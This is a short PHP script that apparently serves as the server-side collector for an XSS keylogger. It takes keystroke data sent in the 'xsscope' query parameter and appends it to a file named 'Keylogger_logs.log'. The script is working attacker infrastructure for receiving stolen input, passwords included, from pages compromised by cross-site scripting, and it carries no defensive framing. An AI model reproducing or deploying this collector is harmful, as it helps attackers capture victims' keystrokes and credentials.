<?php
if(!empty($_GET['xsscope'])) {
    $logfile = fopen('Keylogger_logs.log', 'a+');
    fwrite($logfile, $_GET['xsscope']);
    fclose($logfile);
}
?> 
